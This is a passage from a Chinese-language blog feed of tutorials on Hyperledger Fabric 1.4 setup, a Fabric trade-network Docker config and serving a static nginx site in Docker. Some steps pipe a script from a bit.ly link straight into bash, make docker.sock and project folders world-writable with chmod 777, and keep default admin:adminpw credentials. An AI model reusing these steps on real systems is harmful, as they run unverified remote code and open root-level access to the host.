/etc/hyperledger/fabric-ca-server-config/ca.exporterorg.trade.com-cert.pem --ca.keyfile /etc/hyperledger/fabric-ca-server-config/6842d1c3a357472cc249fe42d3e97ffe7ba0210ab89781a3fdd73cbc30f8934b_sk -b admin:adminpw -d'</span>    <span class="comment">#启动命令  默认登录名和密码（分别为admin和adminpw）</span></span><br><span class="line"><span class="attr">    volumes:</span>   <span class="comment">#挂载卷</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">./crypto-config/peerOrganizations/exporterorg.trade.com/ca/:/etc/hyperledger/fabric-ca-server-config</span></span><br><span class="line"><span class="attr">    container_name:</span> <span class="string">ca_peerExporterOrg</span>    <span class="comment">#容器名</span></span><br><span class="line"><span class="attr">    networks:</span>  <span class="comment">#所处网络</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">trade</span></span><br></pre></td></tr></table></figure><h3 id="五、启动样本交易网络"><a href="#五、启动样本交易网络" class="headerlink" title="五、启动样本交易网络"></a>五、启动样本交易网络</h3><h4 id="1、启动网络"><a href="#1、启动网络" class="headerlink" title="1、启动网络"></a>1、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$./trade.sh up -c tradechannel</span><br></pre></td></tr></table></figure><h4 id="2、查看docker进程"><a href="#2、查看docker进程" class="headerlink" title="2、查看docker进程"></a>2、查看docker进程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps <span class="comment">#查看docker进程</span></span><br><span class="line">CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                       NAMES</span><br><span class="line">a716239d97ad        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 11 seconds       0.0.0.0:9055-&gt;6060/tcp, 0.0.0.0:9051-&gt;7051/tcp, 0.0.0.0:9053-&gt;7053/tcp      peer0.carrierorg.trade.com</span><br><span class="line">c3ce947f9490        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 12 seconds       0.0.0.0:8055-&gt;6060/tcp, 0.0.0.0:8051-&gt;7051/tcp, 0.0.0.0:8053-&gt;7053/tcp      peer0.importerorg.trade.com</span><br><span class="line">f8bae3919c76        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 11 seconds       0.0.0.0:7051-&gt;7051/tcp, 0.0.0.0:7053-&gt;7053/tcp, 0.0.0.0:7055-&gt;6060/tcp      peer0.exporterorg.trade.com</span><br><span class="line">f7fc7b67ab61        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   26 seconds ago      Up 14 seconds       0.0.0.0:7054-&gt;7054/tcp                                                      ca_peerExporterOrg</span><br><span class="line">5c23b50bfbf7        hyperledger/fabric-peer:latest      <span class="string">"peer node start"</span>        26 seconds ago      Up 9 seconds        0.0.0.0:10055-&gt;6060/tcp, 0.0.0.0:10051-&gt;7051/tcp, 0.0.0.0:10053-&gt;7053/tcp   peer0.regulatororg.trade.com</span><br><span class="line">6e0235be3e7e        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   26 seconds ago      Up 9 seconds        0.0.0.0:8054-&gt;7054/tcp                                                      ca_peerImporterOrg</span><br><span class="line">2e47cb0610fc        hyperledger/fabric-orderer:latest   <span class="string">"orderer"</span>                26 seconds ago      Up 13 seconds       0.0.0.0:7050-&gt;7050/tcp                                                      orderer.trade.com</span><br><span class="line">d6e0acddea54        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   27 seconds ago      Up 15 seconds       0.0.0.0:10054-&gt;7054/tcp                                                     ca_peerRegulatorOrg</span><br><span class="line">918e7707db2a        hyperledger/fabric-ca:latest        <span class="string">"sh -c 'fabric-ca-se…"</span>   27 seconds ago      Up 17 seconds       0.0.0.0:9054-&gt;7054/tcp                                                      ca_peerCarrierOrg</span><br></pre></td></tr></table></figure><p>hyperledger/fabric-orderer：启动一个orderer服务</p><p>hyperledger/fabric-peer：启动四个peer服务</p><p>hyperledger/fabric-ca：启动四个peer的MSP服务</p><h4 id="3、查看服务"><a href="#3、查看服务" class="headerlink" title="3、查看服务"></a>3、查看服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs &lt;container-ID&gt; <span class="comment">#查看容器的运行日志</span></span><br><span class="line">$ docker attach &lt;container-ID&gt; <span class="comment">#进入容器交互界面</span></span><br></pre></td></tr></table></figure><h4 id="4、关闭网络"><a href="#4、关闭网络" class="headerlink" title="4、关闭网络"></a>4、关闭网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./trade.sh down -c tradechannel</span><br></pre></td></tr></table></figure><h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>以上是个人学习hyperledger fabric的一些理解和整理，欢迎参考、交流和指正。</p>]]></content>
      
      
      <categories>
          
          <category> 区块链学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blockchain </tag>
            
            <tag> hyperledger </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用docker部署静态网站</title>
      <link href="/2019/03/25/docker/"/>
      <url>/2019/03/25/docker/</url>
      
        <content type="html"><![CDATA[<h3 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h3><h4 id="1、安装docker"><a href="#1、安装docker" class="headerlink" title="1、安装docker"></a>1、安装docker</h4><p>参照<a href="https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分">https://j-kangel.github.io/2019/03/24/hyperledger/里面docker安装部分</a></p><h3 id="二、搭建静态网站"><a href="#二、搭建静态网站" class="headerlink" title="二、搭建静态网站"></a>二、搭建静态网站</h3><h4 id="1、创建docker镜像"><a href="#1、创建docker镜像" class="headerlink" title="1、创建docker镜像"></a>1、创建docker镜像</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 80 --name web -i -t ubuntu /bin/bash  //启动交互式容器</span><br><span class="line">root@6f9c831d1d1b:/<span class="comment">#        //进入docker交互式容器</span></span><br></pre></td></tr></table></figure><h4 id="2、在docker中安装nginx和vim"><a href="#2、在docker中安装nginx和vim" class="headerlink" title="2、在docker中安装nginx和vim"></a>2、在docker中安装nginx和vim</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get update</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y nginx</span></span><br><span class="line">root@6f9c831d1d1b:/<span class="comment"># apt-get install -y vim</span></span><br></pre></td></tr></table></figure><h4 id="3、创建网页目录"><a href="#3、创建网页目录" class="headerlink" title="3、创建网页目录"></a>3、创建网页目录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># mkdir -p /var/www/html</span></span><br></pre></td></tr></table></figure><h4 id="4、添加网页"><a href="#4、添加网页" class="headerlink" title="4、添加网页"></a>4、添加网页</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@6f9c831d1d1b:/<span class="comment"># cd /var/www/html</span></span><br><span class="line">root@6f9c831d1d1b:/var/www/html<span class="comment"># vim index.html</span></span><br></pre></td></tr></table></figure><p>在index.html中输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>nginx in docker<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            Hello,World!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存后退出，查看端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker port web</span><br></pre></td></tr></table></figure><p>显示如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/tcp -&gt; 0.0.0.0:32770</span><br></pre></td></tr></table></figure><h4 id="5、查看网页"><a href="#5、查看网页" class="headerlink" title="5、查看网页"></a>5、查看网页</h4><p>使用curl查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:32770     <span class="comment">#32770为容器端口</span></span><br></pre></td></tr></table></figure><p>使用浏览器查看,如下图所示：</p><p><img alt="" data-src="/2019/03/25/docker/0.JPG" class="lazyload"></p><h3 id="三、docker其他命令"><a href="#三、docker其他命令" class="headerlink" title="三、docker其他命令"></a>三、docker其他命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker attach web  <span class="comment">##重新进入容器</span></span><br><span class="line">docker ps          <span class="comment">##查看docker进程</span></span><br><span class="line">docker top web     <span class="comment">##查看docker容器的进程</span></span><br><span class="line">docker inspect | grep -i IPaddress   <span class="comment">##查看docker的ip地址</span></span><br><span class="line">docker inspect | grep -i hostport    <span class="comment">##查看容器端口</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 区块链学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ubuntu 16.04 搭建hyperledger fabric 1.4</title>
      <link href="/2019/03/24/hyperledger/"/>
      <url>/2019/03/24/hyperledger/</url>
      
        <content type="html"><![CDATA[<h3 id="一、准备阶段"><a href="#一、准备阶段" class="headerlink" title="一、准备阶段"></a>一、准备阶段</h3><h4 id="1、系统软件源改为-aliyun"><a href="#1、系统软件源改为-aliyun" class="headerlink" title="1、系统软件源改为 aliyun"></a>1、系统软件源改为 aliyun</h4><p>步骤：setting -&gt; system settings -&gt; Software&amp;Updates -&gt; Download from -&gt; China -&gt; aliyun</p><p>结果如下：</p><p><img alt="" data-src="/2019/03/24/hyperledger/1.JPG" class="lazyload"></p><h4 id="2、必备软件安装"><a href="#2、必备软件安装" class="headerlink" title="2、必备软件安装"></a>2、必备软件安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装vim          sudo apt-get install vim</span><br><span class="line">安装git          sudo apt-get install git</span><br><span class="line">安装curl         sudo apt-get install curl</span><br><span class="line">安装wget         sudo apt-get install wget</span><br></pre></td></tr></table></figure><h3 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h3><ul><li><p>安装go1.11 以及以上版本</p></li><li><p>安装docker 18.09.3-ce 以及以上版本</p></li><li><p>安装docker-compose 1.23.2 以及以上版本</p></li><li><p>git 拉下 fabric-sample 项目</p></li><li><p>下载docker image镜像</p><h4 id="1、go安装"><a href="#1、go安装" class="headerlink" title="1、go安装"></a>1、go安装</h4><p>下载并安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~  </span><br><span class="line">wget https://studygolang.com/dl/golang/go1.11.linux-amd64.tar.gz    <span class="comment">#下载</span></span><br><span class="line">tar -xzf go1.11.linux-amd64.tar.gz    <span class="comment">#解压</span></span><br><span class="line">sudo mv go /usr/<span class="built_in">local</span>    <span class="comment">#移动</span></span><br></pre></td></tr></table></figure><p>路径配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span>  PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin     <span class="comment">#环境变量</span></span><br><span class="line"><span class="built_in">export</span>  GOROOT=/usr/<span class="built_in">local</span>/go             <span class="comment">#安装根路径</span></span><br><span class="line"><span class="built_in">export</span>  GOPATH=<span class="variable">$HOME</span>/go                  <span class="comment">#为后续安装fabric作准备</span></span><br><span class="line"><span class="built_in">export</span>  PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/go/bin          <span class="comment">#环境变量</span></span><br></pre></td></tr></table></figure><p>创建go目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~   </span><br><span class="line">mkdir  -p  go/src/github.com/hyperledger/fabric <span class="comment">#fabric安装目录</span></span><br><span class="line">sudo chmod -R 777 go</span><br></pre></td></tr></table></figure><h4 id="2、docker安装（使用docker仓库"><a href="#2、docker安装（使用docker仓库" class="headerlink" title="2、docker安装（使用docker仓库)"></a>2、docker安装（使用docker仓库)</h4><p>卸载旧版本docker，未安装docker可忽略此步</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io</span><br></pre></td></tr></table></figure><p>更新apt-get</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>下载安装工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    software-properties-common</span><br></pre></td></tr></table></figure><p>添加官方密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>将加入apt仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="variable">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">   stable"</span></span><br></pre></td></tr></table></figure><p>下载docker-ce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce</span><br></pre></td></tr></table></figure><p>完成上面操作之后输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p>出现下面内容：</p><pre><code>Client: Version:           18.09.3 API version:       1.39 Go version:        go1.10.8 Git commit:        774a1f4 Built:             Thu Feb 28 06:40:58 2019 OS/Arch:           linux/amd64 Experimental:      falseGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.39/version: dial unix /var/run/docker.sock: connect: permission denied</code></pre><p>此时已经安装好Docker了，但是还需要一些小操作。因为普通用户没有权限 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo groupadd docker    <span class="comment">#创建docker组</span></span><br><span class="line">sudo usermod -aG docker <span class="comment">#XXX(XXX是当前用户名)</span></span><br></pre></td></tr></table></figure><p>下面添加阿里云的Docker镜像： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker     <span class="comment">#创建docker目录</span></span><br><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>将以下内容写入daemon.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="attr">"registry-mirrors"</span>: [<span class="string">"https://obou6wyb.mirror.aliyuncs.com"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload </span><br><span class="line">sudo systemctl restart docker </span><br><span class="line">docker version</span><br></pre></td></tr></table></figure><p>如果还有权限不足提示，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod -R 777 /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>正确的结果：</p><pre><code>Client: Version:           18.09.3 API version:       1.39 Go version:        go1.10.8 Git commit:        774a1f4 Built:             Thu Feb 28 06:40:58 2019 OS/Arch:           linux/amd64 Experimental:      falseServer: Docker Engine - Community Engine:  Version:          18.09.3  API version:      1.39 (minimum version 1.12)  Go version:       go1.10.8  Git commit:       774a1f4  Built:            Thu Feb 28 05:59:55 2019  OS/Arch:          linux/amd64  Experimental:     false</code></pre><p>到此docker安装完毕</p><h4 id="3、docker-compose安装"><a href="#3、docker-compose安装" class="headerlink" title="3、docker-compose安装"></a>3、docker-compose安装</h4><p>安装pip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-pip </span><br><span class="line">sudo pip install docker-compose</span><br></pre></td></tr></table></figure><p>查看docker-compose版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><p>出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose version 1.23.2, build 1110ad0</span><br></pre></td></tr></table></figure><p>安装成功！</p><h4 id="4、fabric-sample安装"><a href="#4、fabric-sample安装" class="headerlink" title="4、fabric-sample安装"></a>4、fabric-sample安装</h4><p>git下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> go/src/github.com/hyperledger/fabric/</span><br><span class="line">sudo git <span class="built_in">clone</span> https://github.com/hyperledger/fabric-samples.git</span><br><span class="line">sudo chmod -R 777 fabric-sample   <span class="comment">#修改fabric-sample权限</span></span><br></pre></td></tr></table></figure><h4 id="5、下载docker镜像"><a href="#5、下载docker镜像" class="headerlink" title="5、下载docker镜像"></a>5、下载docker镜像</h4><p>进入fabric目录，输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://bit.ly/2ysbOFE | bash -s -- 1.4.0</span><br></pre></td></tr></table></figure><p>下载等待时间稍久，完成后输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><p>出现以下镜像，则说明下载成功！</p><p><img alt="" data-src="/2019/03/24/hyperledger/2.JPG" class="lazyload"></p><h3 id="三、构建第一个fabric网络"><a href="#三、构建第一个fabric网络" class="headerlink" title="三、构建第一个fabric网络"></a>三、构建第一个fabric网络</h3><h4 id="1、进入fabric-sample-first-network中"><a href="#1、进入fabric-sample-first-network中" class="headerlink" title="1、进入fabric-sample/first-network中"></a>1、进入fabric-sample/first-network中</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fabric-samples/first-network/</span><br></pre></td></tr></table></figure><h4 id="2、生成各种配置文件及工具"><a href="#2、生成各种配置文件及工具" class="headerlink" title="2、生成各种配置文件及工具"></a>2、生成各种配置文件及工具</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m generate -c mytest1   <span class="comment">#mytest为channel名称</span></span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">##########################################################</span><br><span class="line">##### Generate certificates using cryptogen tool #########</span><br><span class="line">##########################################################</span><br><span class="line">+ cryptogen generate --config=./crypto-config.yaml</span><br><span class="line">org1.example.com</span><br><span class="line">org2.example.com</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">/home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/../bin/configtxgen</span><br><span class="line">##########################################################</span><br><span class="line">#########  Generating Orderer Genesis block ##############</span><br><span class="line">##########################################################</span><br><span class="line">CONSENSUS_TYPE=solo</span><br><span class="line">+ &apos;[&apos; solo == solo &apos;]&apos;</span><br><span class="line">+ configtxgen -profile TwoOrgsOrdererGenesis -channelID byfn-sys-channel -outputBlock ./channel-artifacts/genesis.block</span><br><span class="line">2019-03-13 17:02:39.913 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.017 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 002 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.018 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 003 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.101 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 004 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.103 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 005 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.108 CST [common.tools.configtxgen] doOutputBlock -&gt; INFO 006 Generating genesis block</span><br><span class="line">2019-03-13 17:02:40.109 CST [common.tools.configtxgen] doOutputBlock -&gt; INFO 007 Writing genesis block</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">### Generating channel configuration transaction &apos;channel.tx&apos; ###</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID mytest1</span><br><span class="line">2019-03-13 17:02:40.206 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.295 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.371 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.371 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.372 CST [common.tools.configtxgen] doOutputChannelCreateTx -&gt; INFO 005 Generating new channel configtx</span><br><span class="line">2019-03-13 17:02:40.391 CST [common.tools.configtxgen] doOutputChannelCreateTx -&gt; INFO 006 Writing new channel tx</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">#######    Generating anchor peer update for Org1MSP   ##########</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org1MSPanchors.tx -channelID mytest1 -asOrg Org1MSP</span><br><span class="line">2019-03-13 17:02:40.468 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.539 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 005 Generating anchor peer update</span><br><span class="line">2019-03-13 17:02:40.609 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 006 Writing anchor peer update</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br><span class="line"></span><br><span class="line">#################################################################</span><br><span class="line">#######    Generating anchor peer update for Org2MSP   ##########</span><br><span class="line">#################################################################</span><br><span class="line">+ configtxgen -profile TwoOrgsChannel -outputAnchorPeersUpdate ./channel-artifacts/Org2MSPanchors.tx -channelID mytest1 -asOrg Org2MSP</span><br><span class="line">2019-03-13 17:02:40.696 CST [common.tools.configtxgen] main -&gt; INFO 001 Loading configuration</span><br><span class="line">2019-03-13 17:02:40.773 CST [common.tools.configtxgen.localconfig] Load -&gt; INFO 002 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen.localconfig] completeInitialization -&gt; INFO 003 orderer type: solo</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen.localconfig] LoadTopLevel -&gt; INFO 004 Loaded configuration: /home/kangel/go/src/github.com/hyperledger/fabric/fabric-samples/first-network/configtx.yaml</span><br><span class="line">2019-03-13 17:02:40.846 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 005 Generating anchor peer update</span><br><span class="line">2019-03-13 17:02:40.847 CST [common.tools.configtxgen] doOutputAnchorPeersUpdate -&gt; INFO 006 Writing anchor peer update</span><br><span class="line">+ res=0</span><br><span class="line">+ set +x</span><br></pre></td></tr></table></figure><h4 id="3、启动网络"><a href="#3、启动网络" class="headerlink" title="3、启动网络"></a>3、启动网络</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./byfn.sh -m up -c mytest1</span><br></pre></td></tr></table></figure><p>成功后显示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 